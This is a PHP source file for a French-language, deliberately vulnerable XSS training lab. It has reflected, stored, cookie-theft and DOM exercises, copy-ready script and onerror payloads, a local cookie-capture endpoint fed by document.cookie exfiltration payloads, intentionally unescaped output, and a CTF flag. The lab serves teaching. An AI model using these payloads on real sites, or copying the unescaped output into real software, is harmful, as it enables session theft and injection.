<?php
session_start();

// ── Init session state ───────────────────────────────────────────────
if (!isset($_SESSION['comments'])) {
  $_SESSION['comments'] = [
    ['author' => 'Alice', 'message' => 'Bienvenue dans ce forum !', 'safe' => true],
    ['author' => 'Bob',   'message' => 'N\'oublie pas de lire les règles.', 'safe' => true],
  ];
}
if (!isset($_SESSION['progress'])) {
  $_SESSION['progress'] = ['ex1' => false, 'ex2' => false, 'ex3' => false, 'ex4' => false];
}
if (!isset($_SESSION['stolen_cookies'])) {
  $_SESSION['stolen_cookies'] = [];
}
if (!isset($_COOKIE['session_token'])) {
  setcookie('session_token', 'user_' . substr(md5(session_id()), 0, 12), time() + 3600);
}
if (!isset($_COOKIE['admin_secret'])) {
  setcookie('admin_secret', 'FLAG{xss_cookie_stolen_success}', time() + 3600);
}

$page = $_GET['page'] ?? 'guide';

// ── Handle cookie theft endpoint ─────────────────────────────────────
if (isset($_GET['steal'])) {
  $stolen = urldecode($_GET['steal']);
  $entry = ['time' => date('H:i:s'), 'data' => htmlspecialchars($stolen, ENT_QUOTES, 'UTF-8')];
  $_SESSION['stolen_cookies'][] = $entry;

  // Mark ex3 as solved if cookie contains our flag
  if (strpos($stolen, 'FLAG{') !== false || strpos($stolen, 'session_token') !== false) {
    $_SESSION['progress']['ex3'] = true;
  }
  // Return transparent GIF
  header('Content-Type: image/gif');
  echo base64_decode('R0lGODlhAQABAIAAAP///wAAACH5BAEAAAAALAAAAAABAAEAAAICRAEAOw==');
  exit;
}

// ── Handle AJAX progress check ────────────────────────────────────────
if (isset($_GET['api'])) {
  header('Content-Type: application/json');
  if ($_GET['api'] === 'progress') {
    echo json_encode($_SESSION['progress']);
  } elseif ($_GET['api'] === 'cookies') {
    echo json_encode(array_slice($_SESSION['stolen_cookies'], -10));
  } elseif ($_GET['api'] === 'comments') {
    echo json_encode($_SESSION['comments']);
  } elseif ($_GET['api'] === 'check_ex4') {
    echo json_encode(['solved' => $_SESSION['progress']['ex4'] ?? false]);
  }
  exit;
}

// ── Handle POST: comment submission ──────────────────────────────────
if ($_SERVER['REQUEST_METHOD'] === 'POST' && isset($_POST['action'])) {
  if ($_POST['action'] === 'comment') {
    $author  = $_POST['author'] ?? 'Anonyme';
    $message = $_POST['message'] ?? '';
    // Mark ex2 solved if message contains a script tag
    if (preg_match('/<script|onerror|onload|onclick|javascript:/i', $message)) {
      $_SESSION['progress']['ex2'] = true;
    }
    $_SESSION['comments'][] = ['author' => $author, 'message' => $message, 'safe' => false];
    header('Location: ?page=stored#comments');
    exit;
  }
  if ($_POST['action'] === 'reset_comments') {
    $_SESSION['comments'] = [
      ['author' => 'Alice', 'message' => 'Bienvenue dans ce forum !', 'safe' => true],
      ['author' => 'Bob',   'message' => 'N\'oublie pas de lire les règles.', 'safe' => true],
    ];
    header('Location: ?page=stored');
    exit;
  }
  if ($_POST['action'] === 'reset_progress') {
    $_SESSION['progress'] = ['ex1' => false, 'ex2' => false, 'ex3' => false, 'ex4' => false];
    $_SESSION['stolen_cookies'] = [];
    header('Location: ?page=guide');
    exit;
  }
}

// ── Mark ex1 if reflected XSS triggered ──────────────────────────────
if (isset($_GET['search']) && preg_match('/<script|onerror|onload|svg|javascript:/i', $_GET['search'])) {
  $_SESSION['progress']['ex1'] = true;
}

// ── Mark ex4 if DOM hash contains payload ────────────────────────────
// (done client-side via JS, stored server-side via API call)
if (isset($_GET['mark_ex4'])) {
  $_SESSION['progress']['ex4'] = true;
  echo 'ok';
  exit;
}

$progress = $_SESSION['progress'];
$solved_count = count(array_filter($progress));

$base_url = (isset($_SERVER['HTTPS']) ? 'https' : 'http') . '://' . $_SERVER['HTTP_HOST'];

// ─────────────────────────────────────────────────────────────────────
// HTML OUTPUT
// ─────────────────────────────────────────────────────────────────────
?>
<!DOCTYPE html>
<html lang="fr">

<head>
  <meta charset="UTF-8">
  <meta name="viewport" content="width=device-width, initial-scale=1">
  <link rel="stylesheet" href="./style.css" />
  <title>XSS Lab — Apprentissage guidé</title>
</head>

<body>
  <div class="layout">

    <!-- ═══════════════ SIDEBAR ═══════════════ -->
    <aside class="sidebar">
      <div class="sidebar-header">
        <h1>🔓 XSS Lab</h1>
        <p>Apprentissage guidé</p>
      </div>

      <div class="progress-bar-wrap">
        <div class="progress-label">
          <span>Progression</span>
          <span id="prog-count"><?= $solved_count ?>/4 exercices</span>
        </div>
        <div class="progress-bar">
          <div class="progress-fill" id="prog-fill" style="width: <?= ($solved_count / 4) * 100 ?>%"></div>
        </div>
      </div>

      <nav class="nav">
        <div class="nav-section">Démarrage</div>
        <a href="?page=guide" <?= $page === 'guide' ? 'class="active"' : '' ?>>📖 Guide de démarrage</a>
        <a href="?page=theory" <?= $page === 'theory' ? 'class="active"' : '' ?>>🧠 C'est quoi le XSS ?</a>

        <div class="nav-section">Exercices</div>
        <a href="?page=reflected" <?= $page === 'reflected' ? 'class="active"' : '' ?>>
          💥 XSS Réfléchi
          <?php if ($progress['ex1']): ?><span class="badge-ok">✅</span><?php else: ?><span class="badge-no">○</span><?php endif; ?>
        </a>
        <a href="?page=stored" <?= $page === 'stored' ? 'class="active"' : '' ?>>
          💾 XSS Stocké
          <?php if ($progress['ex2']): ?><span class="badge-ok">✅</span><?php else: ?><span class="badge-no">○</span><?php endif; ?>
        </a>
        <a href="?page=steal" <?= $page === 'steal' ? 'class="active"' : '' ?>>
          🍪 Vol de Cookie
          <?php if ($progress['ex3']): ?><span class="badge-ok">✅</span><?php else: ?><span class="badge-no">○</span><?php endif; ?>
        </a>
        <a href="?page=dom" <?= $page === 'dom' ? 'class="active"' : '' ?>>
          🌐 XSS DOM
          <?php if ($progress['ex4']): ?><span class="badge-ok">✅</span><?php else: ?><span class="badge-no">○</span><?php endif; ?>
        </a>

        <div class="nav-section">Défenses</div>
        <a href="?page=defense" <?= $page === 'defense' ? 'class="active"' : '' ?>>🛡️ Comment se protéger ?</a>
      </nav>

      <!-- Cookie Panel -->
      <div style="margin-top:auto; padding-top:10px;">
        <div class="cookie-panel">
          <div class="cookie-panel-header" onclick="toggleCookiePanel()">
            🍪 Cookies interceptés &nbsp;<span id="cookie-count" style="background:var(--danger);color:#fff;border-radius:99px;padding:1px 7px;font-size:0.85em;"><?= count($_SESSION['stolen_cookies']) ?></span>
            <span style="margin-left:auto;color:var(--muted);font-size:0.85em;" id="panel-chevron">▲</span>
          </div>
          <div class="cookie-panel-body" id="cookie-panel-body">
            <?php if (empty($_SESSION['stolen_cookies'])): ?>
              <div class="cookie-empty">Aucun cookie intercepté encore.<br>Réalisez l'exercice 🍪</div>
            <?php else: ?>
              <?php foreach (array_reverse($_SESSION['stolen_cookies']) as $c): ?>
                <div class="cookie-item"><span class="cookie-time"><?= $c['time'] ?></span><?= $c['data'] ?></div>
              <?php endforeach; ?>
            <?php endif; ?>
          </div>
        </div>
      </div>

      <div style="padding:12px 20px; border-top:1px solid var(--border);">
        <form method="POST">
          <input type="hidden" name="action" value="reset_progress">
          <button class="btn btn-ghost" style="width:100%;font-size:0.78em;justify-content:center;" type="submit">↺ Réinitialiser la progression</button>
        </form>
      </div>
    </aside>

    <!-- ═══════════════ MAIN CONTENT ═══════════════ -->
    <main class="main">

      <?php if ($page === 'guide'): ?>
        <!-- ──────────────── GUIDE PAGE ──────────────── -->
        <div class="page-title">📖 Guide de démarrage</div>
        <div class="page-subtitle">Lis cette page avant de commencer — elle répond aux questions fréquentes des débutants.</div>

        <div class="card">
          <div class="card-title">✅ Tu es bien dans le lab si tu vois cette page</div>
          <div class="alert alert-success">
            <strong>Docker fonctionne correctement !</strong> L'application tourne sur <code><?= htmlspecialchars($base_url) ?></code>. Tu es prêt à commencer.
          </div>
          <p class="text-sm" style="line-height:1.7; color: var(--muted);">
            Cette application web est <strong>intentionnellement vulnérable</strong>. Elle simule les erreurs de développement
            les plus courantes qui permettent les attaques XSS. Tout est isolé dans Docker — tu ne peux rien casser sur ton système.
          </p>
        </div>

        <div class="card">
          <div class="card-title">🗺️ Comment utiliser ce lab ?</div>
          <ol class="step-list">
            <li><strong>Commence par la théorie</strong> — Clique sur "🧠 C'est quoi le XSS ?" dans le menu pour comprendre le concept avant de pratiquer.</li>
            <li><strong>Suis les exercices dans l'ordre</strong> — Chaque exercice s'appuie sur le précédent. Commence par "💥 XSS Réfléchi".</li>
            <li><strong>Chaque exercice a des payloads prêts à l'emploi</strong> — Tu n'as pas à les mémoriser, clique dessus pour les copier, puis colle-les dans le champ indiqué.</li>
            <li><strong>Observe le résultat</strong> — Une popup JavaScript ou une action visible confirmera que l'attaque a fonctionné.</li>
            <li><strong>Le ✅ apparaît automatiquement</strong> dans la barre latérale quand l'exercice est réussi.</li>
            <li><strong>Lis les explications</strong> sur pourquoi le code est vulnérable, puis passe aux défenses.</li>
          </ol>
        </div>

        <div class="card">
          <div class="card-title">❓ Questions fréquentes</div>

          <div class="mb-3">
            <p style="font-weight:600; margin-bottom:6px; color: var(--info);">Q : Qu'est-ce qu'un "payload" ?</p>
            <p class="text-sm" style="color: var(--muted); line-height:1.7;">C'est le code malveillant que l'attaquant injecte. Dans ce lab, nos payloads sont des bouts de JavaScript comme <code>&lt;script&gt;alert('XSS')&lt;/script&gt;</code>.</p>
          </div>

          <div class="mb-3">
            <p style="font-weight:600; margin-bottom:6px; color: var(--info);">Q : Pourquoi une popup "alert" ? C'est pas dangereux ça.</p>
            <p class="text-sm" style="color: var(--muted); line-height:1.7;">L'alert est juste une preuve de concept. En situation réelle, l'attaquant remplacerait <code>alert()</code> par du code qui vole tes mots de passe, redirige vers un site de phishing, ou enregistre tes frappes clavier.</p>
          </div>

          <div class="mb-3">
            <p style="font-weight:600; margin-bottom:6px; color: var(--info);">Q : Pourquoi mon exercice n'est pas coché ✅ ?</p>
            <p class="text-sm" style="color: var(--muted); line-height:1.7;">La validation détecte les payloads typiques. Assure-toi d'utiliser exactement les payloads proposés dans la section "À tester". Si la popup apparaît mais que le ✅ ne s'affiche pas, recharge la page.</p>
          </div>

          <div>
            <p style="font-weight:600; margin-bottom:6px; color: var(--info);">Q : Est-ce que je risque quelque chose ?</p>
            <p class="text-sm" style="color: var(--muted); line-height:1.7;">Non. Tout tourne dans un conteneur Docker isolé sur ta machine. Les "cookies volés" restent dans ta session locale. Il est impossible de causer des dommages en dehors du lab.</p>
          </div>
        </div>

        <div class="card" style="border-color: rgba(108,99,255,.3);">
          <div class="card-title">🎯 Prêt ? Commence par ici !</div>
          <div class="flex-gap">
            <a href="?page=theory" class="btn btn-primary">🧠 Comprendre le XSS d'abord →</a>
            <a href="?page=reflected" class="btn btn-ghost">💥 Aller directement au premier exercice</a>
          </div>
        </div>

      <?php elseif ($page === 'theory'): ?>
        <!-- ──────────────── THEORY PAGE ──────────────── -->
        <div class="page-title">🧠 C'est quoi le Cross-Site Scripting ?</div>
        <div class="page-subtitle">Comprends le concept avant de mettre les mains dans le cambouis.</div>

        <div class="card">
          <div class="card-title">🎯 En une phrase</div>
          <div class="alert alert-info">
            Le XSS, c'est quand un attaquant réussit à faire <strong>exécuter son propre code JavaScript</strong> dans le navigateur d'une autre personne, via un site web mal sécurisé.
          </div>
          <p class="text-sm" style="line-height:1.8; color:var(--muted);">
            Le mot "Cross-Site" vient du fait que le script de l'attaquant s'exécute depuis le <em>domaine de confiance</em> de la victime (ex: sa banque, son réseau social...) — ce qui lui donne accès aux cookies, au localStorage, et aux données de ce site.
          </p>
        </div>

        <div class="card">
          <div class="card-title">🔄 Comment ça se passe concrètement ?</div>
          <div class="schema-box">
            <span class="hl-blue">Attaquant</span> → injecte du JS malveillant dans un site web<br>
            &nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;↓<br>
            <span class="hl-red">Site vulnérable</span> → stocke ou réfléchit le code sans le nettoyer<br>
            &nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;↓<br>
            <span class="hl-green">Victime</span> → charge la page, le JS s'exécute dans son navigateur<br>
            &nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;↓<br>
            <span class="hl-acc">Résultat</span> → vol de cookies / redirection / actions à son insu
          </div>
        </div>

        <div class="card">
          <div class="card-title">📦 Les 3 types de XSS que tu vas pratiquer</div>
          <div class="grid-2">
            <div style="background:var(--code-bg); border:1px solid var(--border); border-radius:8px; padding:16px;">
              <div class="flex-gap mb-2"><span>💥</span><strong>Réfléchi</strong><span class="tag tag-warn">Le + courant</span></div>
              <p class="text-sm" style="color:var(--muted); line-height:1.7;">Le payload est dans l'URL. L'attaquant envoie un lien piégé à la victime. L'attaque ne se produit que si la victime clique.</p>
            </div>
            <div style="background:var(--code-bg); border:1px solid var(--border); border-radius:8px; padding:16px;">
              <div class="flex-gap mb-2"><span>💾</span><strong>Stocké</strong><span class="tag tag-danger">Le + dangereux</span></div>
              <p class="text-sm" style="color:var(--muted); line-height:1.7;">Le payload est sauvegardé en base de données (commentaire, profil...). Il s'exécute automatiquement pour chaque visiteur, sans action de l'attaquant.</p>
            </div>
            <div style="background:var(--code-bg); border:1px solid var(--border); border-radius:8px; padding:16px;">
              <div class="flex-gap mb-2"><span>🍪</span><strong>Vol de cookie</strong><span class="tag tag-danger">Impact réel</span></div>
              <p class="text-sm" style="color:var(--muted); line-height:1.7;">Application du XSS stocké pour exfiltrer les cookies de session. Permet à l'attaquant de voler l'identité d'un utilisateur.</p>
            </div>
            <div style="background:var(--code-bg); border:1px solid var(--border); border-radius:8px; padding:16px;">
              <div class="flex-gap mb-2"><span>🌐</span><strong>DOM-Based</strong><span class="tag tag-info">Avancé</span></div>
              <p class="text-sm" style="color:var(--muted); line-height:1.7;">Le payload n'est jamais envoyé au serveur. Le JavaScript de la page lit directement l'URL et insère son contenu dans le DOM sans protection.</p>
            </div>
          </div>
        </div>

        <div class="card">
          <div class="card-title">🔑 Pourquoi le navigateur exécute-t-il ce code ?</div>
          <p class="text-sm" style="color:var(--muted); line-height:1.8; margin-bottom:12px;">
            Le navigateur ne fait pas la différence entre le HTML écrit par le développeur et le HTML injecté par un attaquant. Si le serveur renvoie <code>&lt;script&gt;alert('XSS')&lt;/script&gt;</code>, le navigateur l'exécute, point.
          </p>
          <pre>
&lt;!-- Ce que le développeur voulait afficher : --&gt;
Résultats pour : &lt;strong&gt;php&lt;/strong&gt;

&lt;!-- Ce que l'attaquant envoie dans l'URL : --&gt;
Résultats pour : &lt;script&gt;alert(document.cookie)&lt;/script&gt;

&lt;!-- Ce que le navigateur voit et exécute : --&gt;
Résultats pour : [POPUP avec les cookies de la victime]
</pre>
        </div>

        <div class="card" style="border-color: rgba(108,99,255,.3);">
          <div class="card-title">💡 Tu as compris les bases. On pratique !</div>
          <a href="?page=reflected" class="btn btn-primary">💥 Premier exercice : XSS Réfléchi →</a>
        </div>

      <?php elseif ($page === 'reflected'): ?>
        <!-- ──────────────── EXERCISE 1: REFLECTED XSS ──────────────── -->
        <div class="page-title">💥 Exercice 1 — XSS Réfléchi</div>
        <div class="page-subtitle">Le payload est dans l'URL et renvoyé immédiatement dans la page.</div>

        <?php if ($progress['ex1']): ?>
          <div class="alert alert-success">✅ <strong>Exercice réussi !</strong> Tu as déclenché un XSS réfléchi. Continue vers le bas pour comprendre pourquoi ça a fonctionné.</div>
        <?php endif; ?>

        <!-- Theory recap -->
        <div class="card">
          <div class="card-title">🧠 Rappel — Comment fonctionne ce type d'attaque ?</div>
          <div class="schema-box" style="font-size:0.78em;">
            1. L'attaquant crée une URL avec un payload JS : <span class="hl-red">?search=&lt;script&gt;alert()&lt;/script&gt;</span><br>
            2. La victime clique sur ce lien (reçu par mail, réseau social...)<br>
            3. Le serveur recopie le paramètre dans la page <span class="hl-red">sans le nettoyer</span><br>
            4. Le navigateur de la victime exécute le script → <span class="hl-acc">attaque réussie</span>
          </div>
        </div>

        <!-- Exercise -->
        <div class="card">
          <div class="exercise-header">
            <div class="exercise-title">🔍 Barre de recherche vulnérable</div>
            <div class="exercise-status">
              <?php if ($progress['ex1']): ?>
                <div class="status-pill status-solved">✅ Réussi</div>
              <?php else: ?>
                <div class="status-pill status-unsolved">○ À faire</div>
              <?php endif; ?>
            </div>
          </div>

          <div class="alert alert-warn">
            ⚠️ <strong>Objectif :</strong> Faire apparaître une popup JavaScript en injectant du code dans le champ de recherche.
          </div>

          <!-- Step by step -->
          <ol class="step-list" style="margin-bottom:16px;">
            <li>Clique sur l'un des payloads ci-dessous pour le <strong>copier automatiquement</strong> dans ta presse-papier.</li>
            <li><strong>Colle-le</strong> (Ctrl+V) dans le champ de recherche ci-dessous.</li>
            <li>Clique sur <strong>"Rechercher"</strong> et observe la popup qui apparaît.</li>
            <li>Le ✅ s'affichera automatiquement dans la barre latérale.</li>
          </ol>

          <!-- Payloads -->
          <div class="payload-box">
            <div class="payload-label">💣 Payloads à tester — cliquer pour copier</div>
            <div class="payload-row">
              <div class="payload-code" onclick="copyPayload(this)">&lt;script&gt;alert('XSS Réfléchi !')&lt;/script&gt;</div>
              <button class="copy-btn" onclick="copyPayload(this.previousSibling)">📋 Copier</button>
            </div>
            <div class="payload-row">
              <div class="payload-code" onclick="copyPayload(this)">&lt;img src=x onerror="alert('XSS via img')"&gt;</div>
              <button class="copy-btn" onclick="copyPayload(this.previousSibling)">📋 Copier</button>
            </div>
            <div class="payload-row">
              <div class="payload-code" onclick="copyPayload(this)">&lt;svg onload="alert(document.domain)"&gt;</div>
              <button class="copy-btn" onclick="copyPayload(this.previousSibling)">📋 Copier</button>
            </div>
          </div>

          <hr class="divider">

          <!-- Vulnerable form -->
          <form method="GET" action="">
            <input type="hidden" name="page" value="reflected">
            <label style="display:block; margin-bottom:6px; font-size:0.85em; color:var(--muted);">🔍 Champ de recherche (vulnérable) :</label>
            <input type="text" name="search" placeholder="Colle ton payload ici..." value="<?= $_GET['search'] ?? '' ?>">
            <button type="submit" class="btn btn-primary">🔍 Rechercher</button>
          </form>

          <?php if (isset($_GET['search'])): ?>
            <div class="search-result" style="margin-top:12px;">
              <p class="text-sm text-muted mb-2">Résultats pour :</p>
              <strong><?= $_GET['search'] /* ⚠️ INTENTIONNELLEMENT VULNÉRABLE — pas de htmlspecialchars() */ ?></strong>
            </div>
            <div class="url-display">🔗 <?= 'http://' . $_SERVER['HTTP_HOST'] . $_SERVER['REQUEST_URI'] ?></div>
          <?php endif; ?>
        </div>

        <!-- Explanation -->
        <div class="card">
          <div class="card-title">🔬 Pourquoi ça a marché ?</div>
          <p class="text-sm" style="color:var(--muted); line-height:1.8; margin-bottom:12px;">
            Le serveur PHP récupère la valeur du paramètre <code>search</code> et l'insère <em>directement</em> dans le HTML renvoyé au navigateur, sans aucun nettoyage.
          </p>
          <pre>
// ❌ CODE VULNÉRABLE (dans index.php)
echo $_GET['search'];
// → Si search = &lt;script&gt;alert()&lt;/script&gt;, le navigateur exécute le script.

// ✅ CODE SÉCURISÉ
echo htmlspecialchars($_GET['search'], ENT_QUOTES, 'UTF-8');
// → Transforme &lt; en &amp;lt; — le navigateur affiche le texte, n'exécute pas le JS.</pre>

          <div class="flex-gap" style="margin-top:16px;">
            <a href="?page=stored" class="btn btn-primary">Exercice suivant : XSS Stocké →</a>
          </div>
        </div>

      <?php elseif ($page === 'stored'): ?>
        <!-- ──────────────── EXERCISE 2: STORED XSS ──────────────── -->
        <div class="page-title">💾 Exercice 2 — XSS Stocké</div>
        <div class="page-subtitle">Le payload est sauvegardé et s'exécute pour chaque visiteur de la page.</div>

        <?php if ($progress['ex2']): ?>
          <div class="alert alert-success">✅ <strong>Exercice réussi !</strong> Tu as injecté un script dans la section commentaires.</div>
        <?php endif; ?>

        <div class="card">
          <div class="card-title">🧠 Rappel — Pourquoi c'est le plus dangereux ?</div>
          <div class="schema-box" style="font-size:0.78em;">
            <span class="hl-blue">Attaquant</span> → poste un commentaire avec un payload JS<br>
            <span class="hl-red">Serveur</span> → sauvegarde le commentaire <span class="hl-red">tel quel</span> en base de données<br>
            <span class="hl-green">Victime 1</span> → visite la page → son navigateur exécute le payload<br>
            <span class="hl-green">Victime 2</span> → visite la page → son navigateur exécute le payload<br>
            <span class="hl-acc">...</span> pour CHAQUE visiteur, automatiquement, même sans lien piégé
          </div>
        </div>

        <div class="card">
          <div class="exercise-header">
            <div class="exercise-title">💬 Forum de commentaires (vulnérable)</div>
            <div class="exercise-status">
              <?php if ($progress['ex2']): ?>
                <div class="status-pill status-solved">✅ Réussi</div>
              <?php else: ?>
                <div class="status-pill status-unsolved">○ À faire</div>
              <?php endif; ?>
            </div>
          </div>

          <div class="alert alert-warn">
            ⚠️ <strong>Objectif :</strong> Poster un commentaire contenant du JavaScript. Il sera exécuté à chaque affichage de la page.
          </div>

          <ol class="step-list" style="margin-bottom:16px;">
            <li>Copie l'un des payloads ci-dessous.</li>
            <li>Colle-le dans le champ <strong>"Commentaire"</strong> (le champ Nom peut rester vide).</li>
            <li>Clique sur <strong>"Publier"</strong>.</li>
            <li>La page se recharge — le script s'exécute automatiquement depuis les commentaires.</li>
          </ol>

          <div class="payload-box">
            <div class="payload-label">💣 Payloads à tester</div>
            <div class="payload-row">
              <div class="payload-code" onclick="copyPayload(this)">&lt;script&gt;alert('XSS Stocké ! Je suis dans la BDD.')&lt;/script&gt;</div>
              <button class="copy-btn" onclick="copyPayload(this.previousSibling)">📋 Copier</button>
            </div>
            <div class="payload-row">
              <div class="payload-code" onclick="copyPayload(this)">&lt;img src=x onerror="alert('XSS via image brisée')"&gt;</div>
              <button class="copy-btn" onclick="copyPayload(this.previousSibling)">📋 Copier</button>
            </div>
          </div>

          <hr class="divider">

          <form method="POST" style="margin-bottom:16px;">
            <input type="hidden" name="action" value="comment">
            <label style="display:block; margin-bottom:6px; font-size:0.85em; color:var(--muted);">Nom (optionnel) :</label>
            <input type="text" name="author" placeholder="Ton pseudonyme..." style="margin-bottom:8px;">
            <label style="display:block; margin-bottom:6px; font-size:0.85em; color:var(--muted);">Commentaire — colle le payload ici :</label>
            <textarea name="message" placeholder="Colle ton payload ici..."></textarea>
            <div class="flex-gap">
              <button type="submit" class="btn btn-primary">📤 Publier</button>
            </div>
          </form>

          <hr class="divider">

          <div id="comments">
            <p style="font-weight:600; margin-bottom:10px; font-size:0.9em;">💬 Commentaires (<span id="comment-count"><?= count($_SESSION['comments']) ?></span>) :</p>
            <?php foreach ($_SESSION['comments'] as $i => $c): ?>
              <div class="comment <?= !$c['safe'] ? 'comment-injected' : '' ?>">
                <div class="comment-author">👤 <?= htmlspecialchars($c['author'], ENT_QUOTES, 'UTF-8') ?> <?= !$c['safe'] ? '<span class="tag tag-danger" style="font-size:0.65em;">injection</span>' : '' ?></div>
                <div class="comment-body"><?= $c['message'] /* ⚠️ INTENTIONNELLEMENT VULNÉRABLE */ ?></div>
              </div>
            <?php endforeach; ?>
          </div>

          <form method="POST" style="margin-top:12px;">
            <input type="hidden" name="action" value="reset_comments">
            <button type="submit" class="btn btn-ghost" style="font-size:0.8em;">🔄 Réinitialiser les commentaires</button>
          </form>
        </div>

        <div class="card">
          <div class="card-title">🔬 Analyse du code vulnérable</div>
          <pre>
// ❌ Le commentaire est inséré dans le HTML sans protection
echo $comment['message'];
// → Si message = &lt;script&gt;...&lt;/script&gt;, le navigateur de chaque
//   visiteur exécute ce script.

// ✅ Solution
echo htmlspecialchars($comment['message'], ENT_QUOTES, 'UTF-8');</pre>

          <div class="flex-gap" style="margin-top:16px;">
            <a href="?page=steal" class="btn btn-primary">Exercice suivant : Vol de Cookie →</a>
          </div>
        </div>

      <?php elseif ($page === 'steal'): ?>
        <!-- ──────────────── EXERCISE 3: COOKIE STEALER ──────────────── -->
        <div class="page-title">🍪 Exercice 3 — Vol de Cookie (Session Hijacking)</div>
        <div class="page-subtitle">Application concrète du XSS stocké pour voler une session utilisateur.</div>

        <?php if ($progress['ex3']): ?>
          <div class="alert alert-success">✅ <strong>Exercice réussi !</strong> Tu as exfiltré des cookies via XSS. Regarde le panneau "Cookies interceptés" dans la barre latérale !</div>
        <?php endif; ?>

        <div class="card">
          <div class="card-title">🧠 Pourquoi les cookies sont-ils une cible ?</div>
          <p class="text-sm" style="color:var(--muted); line-height:1.8; margin-bottom:12px;">
            Les cookies de session permettent au site de savoir que tu es connecté. Si un attaquant vole ton cookie <code>session_token</code>, il peut se faire passer pour toi sur ce site sans connaître ton mot de passe.
          </p>
          <div class="schema-box" style="font-size:0.78em;">
            <span class="hl-blue">Attaquant</span> → injecte JS qui lit <span class="hl-red">document.cookie</span><br>
            <span class="hl-green">Victime</span> → charge la page → son navigateur envoie ses cookies<br>
            <span class="hl-blue">Attaquant</span> → reçoit les cookies → se connecte à sa place<br>
            &nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;→ La victime ne se rend compte de rien
          </div>
        </div>

        <div class="card">
          <div class="exercise-header">
            <div class="exercise-title">🎣 Exfiltration de cookie</div>
            <div class="exercise-status">
              <?php if ($progress['ex3']): ?>
                <div class="status-pill status-solved">✅ Réussi</div>
              <?php else: ?>
                <div class="status-pill status-unsolved">○ À faire</div>
              <?php endif; ?>
            </div>
          </div>

          <div class="alert alert-warn">
            ⚠️ <strong>Objectif :</strong> Utiliser un payload XSS pour envoyer les cookies de la victime vers ce serveur. Le résultat apparaîtra en temps réel dans le panneau "🍪 Cookies interceptés".
          </div>

          <ol class="step-list" style="margin-bottom:16px;">
            <li>Copie le payload de vol de cookie ci-dessous.</li>
            <li>Va dans l'exercice <a href="?page=stored" style="color:var(--accent);">💾 XSS Stocké</a> et poste-le comme commentaire.</li>
            <li>Reviens ici ou recharge la page — le cookie devrait apparaître dans le panneau latéral.</li>
            <li>Tu peux aussi tester directement via la <strong>barre de recherche de l'exercice 1</strong>.</li>
          </ol>

          <div class="payload-box">
            <div class="payload-label">🍪 Payloads de vol de cookie</div>
            <div class="payload-row">
              <div class="payload-code" onclick="copyPayload(this)">&lt;script&gt;new Image().src="/?steal="+document.cookie&lt;/script&gt;</div>
              <button class="copy-btn" onclick="copyPayload(this.previousSibling)">📋 Copier</button>
            </div>
            <div class="payload-row">
              <div class="payload-code" onclick="copyPayload(this)">&lt;img src=x onerror="fetch('/?steal='+document.cookie)"&gt;</div>
              <button class="copy-btn" onclick="copyPayload(this.previousSibling)">📋 Copier</button>
            </div>
          </div>
        </div>

        <div class="card">
          <div class="card-title">🍪 Cookies interceptés (temps réel)</div>
          <div id="live-cookie-panel">
            <?php if (empty($_SESSION['stolen_cookies'])): ?>
              <div class="alert alert-info">Aucun cookie intercepté pour l'instant. Lance un payload de l'exercice ci-dessus !</div>
            <?php else: ?>
              <?php foreach (array_reverse($_SESSION['stolen_cookies']) as $c): ?>
                <div class="comment" style="border-color:rgba(34,197,94,.4);">
                  <div class="comment-author">⏱️ <?= $c['time'] ?></div>
                  <div class="comment-body" style="font-family:monospace; font-size:0.8em; color:var(--success);"><?= $c['data'] ?></div>
                </div>
              <?php endforeach; ?>
            <?php endif; ?>
          </div>
          <button class="btn btn-ghost" style="font-size:0.8em; margin-top:10px;" onclick="refreshCookies()">🔄 Actualiser</button>
        </div>

        <div class="card">
          <div class="card-title">🛡️ La défense : flag HttpOnly</div>
          <pre>
// ❌ Cookie accessible depuis JavaScript :
setcookie('session_token', $token);
// document.cookie retourne : "session_token=abc123"

// ✅ Cookie HttpOnly — invisible pour JavaScript :
setcookie('session_token', $token, ['httponly' => true, 'secure' => true]);
// document.cookie retourne : "" (vide — le cookie existe mais JS ne peut pas le lire)</pre>
          <div class="alert alert-info" style="margin-top:12px;">
            💡 <strong>Attention :</strong> HttpOnly protège contre le vol de cookie, mais pas contre toutes les formes de XSS. Un attaquant peut toujours exécuter des actions au nom de la victime.
          </div>

          <div class="flex-gap" style="margin-top:16px;">
            <a href="?page=dom" class="btn btn-primary">Exercice suivant : XSS DOM →</a>
          </div>
        </div>

      <?php elseif ($page === 'dom'): ?>
        <!-- ──────────────── EXERCISE 4: DOM XSS ──────────────── -->
        <div class="page-title">🌐 Exercice 4 — XSS basé sur le DOM</div>
        <div class="page-subtitle">Le payload n'est jamais envoyé au serveur. Le JavaScript de la page lui-même crée la vulnérabilité.</div>

        <?php if ($progress['ex4']): ?>
          <div class="alert alert-success">✅ <strong>Exercice réussi !</strong> Tu as déclenché un XSS DOM-Based.</div>
          <div class="card" style="border-color: rgba(34,197,94,.4); text-align:center;">
            <div class="card-title">🏁 Flag</div>
            <p class="text-sm" style="color:var(--muted); margin-bottom:12px;">
              Soumets ce flag sur la plateforme d'apprentissage pour valider le lab.
            </p>
            <div style="background:var(--code-bg); border:1px solid var(--border); border-radius:8px; padding:16px; font-family:monospace; font-size:1.1em; letter-spacing:2px; color:var(--success);">
              <?= htmlspecialchars(getenv('LAB_FLAG') ?: 'DIABLE{XSS_LAB_COMPLETED}') ?>
            </div>
            <button class="btn btn-primary" style="margin-top:12px;" onclick="copyFlag()">📋 Copier le flag</button>
          </div>

          <script>
            function copyFlag() {
              var flag = '<?= htmlspecialchars(getenv('LAB_FLAG') ?: 'DIABLE{XSS_LAB_COMPLETED}') ?>';
              navigator.clipboard.writeText(flag).then(function() {
                alert('Flag copié !');
              });
            }
          </script>
        <?php endif; ?>

        <div class="card">
          <div class="card-title">🧠 Ce qui est différent ici</div>
          <div class="grid-2" style="margin-bottom:12px;">
            <div style="background:var(--code-bg); border:1px solid var(--border); border-radius:8px; padding:14px;">
